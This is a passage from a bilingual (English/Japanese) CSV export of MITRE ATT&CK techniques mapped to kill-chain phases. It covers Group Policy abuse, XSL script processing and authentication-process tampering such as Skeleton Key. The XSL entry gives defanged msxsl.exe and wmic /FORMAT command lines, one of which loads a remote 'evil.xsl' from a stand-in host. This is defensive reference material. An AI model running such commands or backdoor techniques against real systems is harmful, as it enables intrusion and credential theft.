Modifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants.

With sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include:

* modifying GPOs to push a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005) to computers throughout the domain environment(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)
* modifying domain trusts to include an adversary-controlled domain, allowing adversaries to  forge access tokens that will subsequently be accepted by victim domain resources(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks)
* changing configuration settings within the AD environment to implement a [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207).
* adding new, adversary-controlled federated identity providers to identity tenants, allowing adversaries to authenticate as any user managed by the victim tenant (Citation: Okta Cross-Tenant Impersonation 2023)

Adversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",T1484.001,グループポリシーの変更,Group Policy Modification,"攻撃者は、ドメインの意図した任意アクセス制御を破壊するためにグループポリシーオブジェクト（GPO）を変更する可能性があり、通常はドメイン上の権限を昇格させることを目的としています。グループポリシーは、Active Directory（AD）内のユーザーとコンピューターの設定を一元管理できるようにします。GPOは、予測可能なネットワークパス`\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`内に保存されているファイルで構成されるグループポリシー設定のコンテナーです。(引用: TechNet Group Policy Basics)(引用: ADSecurity GPO Persistence 2016)

AD内の他のオブジェクトと同様に、GPOにはアクセス制御が関連付けられています。デフォルトでは、ドメイン内のすべてのユーザーアカウントがGPOの読み取り権限を持っています。GPOアクセス制御権限（書き込みアクセスなど）をドメイン内の特定のユーザーまたはグループに委任することが可能です。

悪意のあるGPOの変更は、[スケジュールされたタスク/ジョブ](https://attack.mitre.org/techniques/T1053)、[ツールの無効化または変更](https://attack.mitre.org/techniques/T1562/001)、[イングレスツール転送](https://attack.mitre.org/techniques/T1105)、[アカウントの作成](https://attack.mitre.org/techniques/T1136)、[サービス実行](https://attack.mitre.org/techniques/T1569/002)など、他の多くの悪意のある動作を実装するために使用できます。(引用: ADSecurity GPO Persistence 2016)(引用: Wald0 Guide to GPOs)(引用: Harmj0y Abusing GPO Permissions)(引用: Mandiant M Trends 2016)(引用: Microsoft Hacking Team Breach) GPOはAD環境内の非常に多くのユーザーとマシンの設定を制御できるため、このGPOの悪用から生じる可能性のある潜在的な攻撃は多数あります。(引用: Wald0 Guide to GPOs)

例えば、<code>New-GPOImmediateTask</code>などの一般に入手可能なスクリプトを利用して、GPO設定を変更することにより、悪意のある[スケジュールされたタスク/ジョブ](https://attack.mitre.org/techniques/T1053)の作成を自動化できます。この場合、<code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>を変更します。(引用: Wald0 Guide to GPOs)(引用: Harmj0y Abusing GPO Permissions) 場合によっては、攻撃者は、<code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>で設定されているSeEnableDelegationPrivilegeなどの特定のユーザー権限を変更して、攻撃者の制御下にあるユーザーアカウントがGPOを変更できるようになるため、ドメインを完全に制御できる巧妙なADバックドアを実現する可能性があります。(引用: Harmj0y SeEnableDelegationPrivilege Right)","Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) 

Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.

Malicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)

For example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1220,XSLスクリプト処理,XSL Script Processing,"攻撃者は、XSLファイル内にスクリプトを埋め込むことにより、アプリケーション制御をバイパスし、コードの実行を難読化する可能性があります。拡張スタイルシート言語（XSL）ファイルは、XMLファイル内のデータの処理とレンダリングを記述するためによく使用されます。複雑な操作をサポートするために、XSL標準にはさまざまな言語での埋め込みスクリプトのサポートが含まれています。(引用: Microsoft XSLT Script Mar 2017)

敵対者は、アプリケーション制御をバイパスしながら任意のファイルを実行するためにこの機能を悪用する可能性があります。[信頼できる開発者ユーティリティ プロキシ実行](https://attack.mitre.org/techniques/T1127)と同様に、Microsoft共通線形変換ユーティリティバイナリ (msxsl.exe) (引用: Microsoft msxsl.exe) をインストールして使用し、ローカルまたはリモート (URL参照) XSLファイルに埋め込まれた悪意のあるJavaScriptを実行することができます。(引用: Penetration Testing Lab MSXSL July 2017) msxsl.exeはデフォルトではインストールされないため、敵対者はドロップされたファイルと共にパッケージ化する必要があるでしょう。(引用: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exeは、XMLソースファイルとXSLスタイルシートの2つの主要な引数を取ります。XSLファイルは有効なXMLであるため、敵対者は同じXSLファイルを2回呼び出すかもしれません。msxsl.exeを使用する場合、敵対者はXML/XSLファイルに任意のファイル拡張子を付けることもできます。(引用: XSL Bypass Mar 2019)

コマンドラインの例：(引用: Penetration Testing Lab MSXSL July 2017)(引用: XSL Bypass Mar 2019)

* <code>msxsl.exe customers[.]xml script[.]xsl</code>
* <code>msxsl.exe script[.]xsl script[.]xsl</code>
* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>

「Squiblytwo」と呼ばれるこのテクニックの別のバリエーションでは、[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)を使用してXSLファイル内のJScriptまたはVBScriptを呼び出します。(引用: LOLBAS Wmic) このテクニックは、ローカル/リモートスクリプトも実行でき、[Regsvr32](https://attack.mitre.org/techniques/T1218/010)/「Squiblydoo」の対応物と同様に、信頼できる組み込みのWindowsツールを活用します。敵対者は、/FORMATスイッチを利用する限り、[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)で提供されるエイリアスを悪用する可能性があります。(引用: XSL Bypass Mar 2019)

コマンドラインの例：(引用: XSL Bypass Mar 2019)(引用: LOLBAS Wmic)

* ローカルファイル：<code>wmic process list /FORMAT:evil[.]xsl</code>
* リモートファイル：<code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>","Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)

Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)

* <code>msxsl.exe customers[.]xml script[.]xsl</code>
* <code>msxsl.exe script[.]xsl script[.]xsl</code>
* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>

Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ \""Squiblydoo\"" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)

* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>",,,,,,5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1556,認証プロセスの変更,Modify Authentication Process,"攻撃者は、ユーザー資格情報へのアクセスや、他の方法では保証されないアカウントへのアクセスを可能にするために、認証メカニズムとプロセスを変更する可能性があります。認証プロセスは、Windowsのローカルセキュリティ認証サーバー（LSASS）プロセスとセキュリティアカウントマネージャー（SAM）、Unixベースシステムのプラグ可能な認証モジュール（PAM）、MacOSシステムの認証プラグインなどのメカニズムによって処理され、資格情報の収集、保存、検証を担当します。認証プロセスを変更することにより、攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用せずにサービスまたはシステムに認証できる可能性があります。

攻撃者は、資格情報を明らかにしたり認証メカニズムをバイパスしたりするために、このプロセスの一部を悪意を持って変更する可能性があります。侵害された資格情報またはアクセスは、ネットワーク内のシステムのさまざまなリソースに配置されたアクセス制御をバイパスするために使用される場合があり、VPN、Outlook Web Access、リモートデスクトップなど、リモートシステムや外部からアクセス可能なサービスへの永続的なアクセスに使用されることさえあります。","Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).

Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",T1556.004,ネットワークデバイス認証,Network Device Authentication,"攻撃者は[システムイメージのパッチ適用](https://attack.mitre.org/techniques/T1601/001)を使用してオペレーティングシステムにパスワードをハードコードし、ネットワークデバイス上のローカルアカウントのネイティブ認証メカニズムをバイパスする可能性があります。

[システムイメージの変更](https://attack.mitre.org/techniques/T1601)には、特定のパスワードを使用して攻撃者にアクセスを提供するために、ネットワークデバイスのオペレーティングシステムに埋め込まれたコードが含まれる場合があります。変更には、パッチを介してオペレーティングシステムイメージに埋め込まれる特定のパスワードが含まれます。認証試行時に、挿入されたコードはまずユーザー入力がパスワードであるかどうかを確認します。そうであれば、アクセスが許可されます。それ以外の場合、埋め込まれたコードは、潜在的に有効な資格情報の検証のために資格情報を渡します。(引用: Mandiant - Synful Knock)","Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.

[Modify System Image](https://attack.mitre.org/techniques/T1601) may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.(Citation: Mandiant - Synful Knock)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1556,認証プロセスの変更,Modify Authentication Process,"攻撃者は、ユーザー資格情報へのアクセスや、他の方法では保証されないアカウントへのアクセスを可能にするために、認証メカニズムとプロセスを変更する可能性があります。認証プロセスは、Windowsのローカルセキュリティ認証サーバー（LSASS）プロセスとセキュリティアカウントマネージャー（SAM）、Unixベースシステムのプラグ可能な認証モジュール（PAM）、MacOSシステムの認証プラグインなどのメカニズムによって処理され、資格情報の収集、保存、検証を担当します。認証プロセスを変更することにより、攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用せずにサービスまたはシステムに認証できる可能性があります。

攻撃者は、資格情報を明らかにしたり認証メカニズムをバイパスしたりするために、このプロセスの一部を悪意を持って変更する可能性があります。侵害された資格情報またはアクセスは、ネットワーク内のシステムのさまざまなリソースに配置されたアクセス制御をバイパスするために使用される場合があり、VPN、Outlook Web Access、リモートデスクトップなど、リモートシステムや外部からアクセス可能なサービスへの永続的なアクセスに使用されることさえあります。","Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).

Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",T1556.001,ドメインコントローラー認証,Domain Controller Authentication,"攻撃者はドメインコントローラーの認証プロセスにパッチを適用して、通常の認証メカニズムをバイパスし、アカウントへのアクセスを可能にする可能性があります。

マルウェアは、ユーザーのアカウントや資格情報（例：[スケルトンキー](https://attack.mitre.org/software/S0007)）へのアクセスに使用されるバックドアを作成する目的で、ドメインコントローラーの認証プロセスに偽の資格情報を注入するために使用される場合があります。スケルトンキーは、エンタープライズドメインコントローラー認証プロセス（LSASS）へのパッチを介して機能し、攻撃者が標準の認証システムをバイパスするために使用できる資格情報を含みます。パッチが適用されると、攻撃者は注入されたパスワードを使用して、任意のドメインユーザーアカウントとして正常に認証できます（ドメインコントローラーの再起動によってスケルトンキーがメモリから消去されるまで）。認証されたアクセスにより、単一要素認証環境内のホストやリソースへの無制限のアクセスが可能になる場合があります。(引用: Dell Skeleton)","Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts.

Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.(Citation: Dell Skeleton)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1556,認証プロセスの変更,Modify Authentication Process,"攻撃者は、ユーザー資格情報へのアクセスや、他の方法では保証されないアカウントへのアクセスを可能にするために、認証メカニズムとプロセスを変更する可能性があります。認証プロセスは、Windowsのローカルセキュリティ認証サーバー（LSASS）プロセスとセキュリティアカウントマネージャー（SAM）、Unixベースシステムのプラグ可能な認証モジュール（PAM）、MacOSシステムの認証プラグインなどのメカニズムによって処理され、資格情報の収集、保存、検証を担当します。認証プロセスを変更することにより、攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用せずにサービスまたはシステムに認証できる可能性があります。

攻撃者は、資格情報を明らかにしたり認証メカニズムをバイパスしたりするために、このプロセスの一部を悪意を持って変更する可能性があります。侵害された資格情報またはアクセスは、ネットワーク内のシステムのさまざまなリソースに配置されたアクセス制御をバイパスするために使用される場合があり、VPN、Outlook Web Access、リモートデスクトップなど、リモートシステムや外部からアクセス可能なサービスへの永続的なアクセスに使用されることさえあります。","Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).

Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",T1556.009,条件付きアクセスポリシー,Conditional Access Policies,"攻撃者は、侵害されたアカウントへの永続的なアクセスを可能にするために、条件付きアクセスポリシーを無効化または変更する可能性があります。条件付きアクセスポリシーは、IDプロバイダーおよびIDおよびアクセス管理システムが、ユーザーにリソースへのアクセスを許可するかどうかを判断するために使用する追加の検証です。

例えば、Entra ID、Okta、JumpCloudでは、ユーザーはIPアドレス、デバイス登録状況、多要素認証の使用状況に基づいてアプリケーションへのアクセスを拒否される可能性があります。(引用: Microsoft Conditional Access)(引用: JumpCloud Conditional Access Policies)(引用: Okta Conditional Access Policies) 場合によっては、IDプロバイダーはさまざまなインジケーターに基づいてサインインを拒否するためにリスクベースのメトリックの使用をサポートすることもあります。AWSおよびGCPでは、IAMポリシーに、送信元IP、リクエストが行われた日付、要求されているリソースまたはリージョンの性質などの任意の制約を検証する`condition`属性を含めることができます。(引用: AWS IAM Conditions)(引用: GCP IAM Conditions) これらの措置は、侵害された資格情報がデータやリソースへの不正アクセスにつながるのを防ぐのに役立ち、また、ユーザー権限を必要なものだけに制限するのにも役立ちます。

信頼できるIP範囲を追加したり、[多要素認証](https://attack.mitre.org/techniques/T1556/006)要件を削除したり、追加の[未使用/未サポートのクラウドリージョン](https://attack.mitre.org/techniques/T1535)を許可したりするなど、条件付きアクセスポリシーを変更することにより、攻撃者はアカウントへの永続的なアクセスを確保し、防御策を回避できる可能性があります。","Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.

For example, in Entra ID, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required.

By modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1556,認証プロセスの変更,Modify Authentication Process,"攻撃者は、ユーザー資格情報へのアクセスや、他の方法では保証されないアカウントへのアクセスを可能にするために、認証メカニズムとプロセスを変更する可能性があります。認証プロセスは、Windowsのローカルセキュリティ認証サーバー（LSASS）プロセスとセキュリティアカウントマネージャー（SAM）、Unixベースシステムのプラグ可能な認証モジュール（PAM）、MacOSシステムの認証プラグインなどのメカニズムによって処理され、資格情報の収集、保存、検証を担当します。認証プロセスを変更することにより、攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用せずにサービスまたはシステムに認証できる可能性があります。

攻撃者は、資格情報を明らかにしたり認証メカニズムをバイパスしたりするために、このプロセスの一部を悪意を持って変更する可能性があります。侵害された資格情報またはアクセスは、ネットワーク内のシステムのさまざまなリソースに配置されたアクセス制御をバイパスするために使用される場合があり、VPN、Outlook Web Access、リモートデスクトップなど、リモートシステムや外部からアクセス可能なサービスへの永続的なアクセスに使用されることさえあります。","Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).

Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",T1556.008,ネットワークプロバイダーDLL,Network Provider DLL,"攻撃者は、認証プロセス中に平文のユーザー資格情報をキャプチャするために、悪意のあるネットワークプロバイダーダイナミックリンクライブラリ（DLL）を登録する可能性があります。ネットワークプロバイダーDLLにより、Windowsは特定のネットワークプロトコルと連携でき、アドオンの資格情報管理機能もサポートできます。(引用: Network Provider API) ログオンプロセス中、Winlogon（対話型ログオンモジュール）はRPCを介してローカルの`mpnotify.exe`プロセスに資格情報を送信します。その後、`mpnotify.exe`プロセスは、ログオンイベントが発生していることを通知する際に、登録済みの資格情報マネージャーと平文で資格情報を共有します。(引用: NPPSPY - Huntress)(引用: NPPSPY Video)(引用: NPLogonNotify)

敵対者は、`mpnotify.exe`から資格情報を受信するように悪意のあるネットワークプロバイダーDLLを設定することができる（引用：NPPSPY）。クレデンシャルマネージャーとして（レジストリを介して）インストールされると、悪意のあるDLLは、ユーザーが`NPLogonNotify()`関数を介してWindowsワークステーションまたはドメインにログオンするたびに、クレデンシャルを受信して保存することができる（引用：NPLogonNotify）。

